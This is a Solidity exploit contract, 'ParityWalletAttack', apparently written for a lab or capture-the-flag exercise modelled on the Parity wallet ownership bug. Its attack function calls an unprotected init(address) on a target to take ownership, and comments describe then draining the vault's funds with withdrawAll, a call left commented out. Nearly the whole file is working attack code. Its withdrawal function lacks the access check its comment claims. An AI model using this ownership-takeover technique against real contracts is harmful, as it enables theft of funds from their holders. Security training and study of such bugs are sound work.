// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

import "contracts/CryptoVault.sol";

contract ParityWalletAttack {
    CryptoVault public vulnerableContract;

    constructor(address payable _vulnerableContract) public {
        vulnerableContract = CryptoVault(_vulnerableContract);
    }

    // Function to exploit the vulnerability and change ownership
    function attack(address _target) public {
        // Call init function of VaultLib with the attacker's address
        _target.call(abi.encodeWithSignature("init(address)", address(this)));

        // Now that the owner is changed to the attacker's address,
        // we can call withdrawAll to drain all funds from the CryptoVault
        //vulnerableContract.withdrawAll();
    }

    // Function to deposit some funds to the vulnerable contract
    function depositFunds() public payable {
        // Call deposit function of the vulnerable contract
        vulnerableContract.deposit{value: msg.value}();
    }

    // Function to withdraw any remaining funds from the attack contract
    function withdrawFunds() public {
        // Only the contract owner (attacker) should be able to withdraw
        msg.sender.transfer(address(this).balance);
    }

    // Function to get the balance of the vulnerable contract
    function getVulnerableContractBalance() public view returns (uint) {
        return address(vulnerableContract).balance;
    }

    // Function to check the owner of the vulnerable contract
    function getOwner() public view returns (address) {
        return vulnerableContract.owner();
    }

    // Fallback function to receive ether sent to this contract
    receive() external payable {}
}
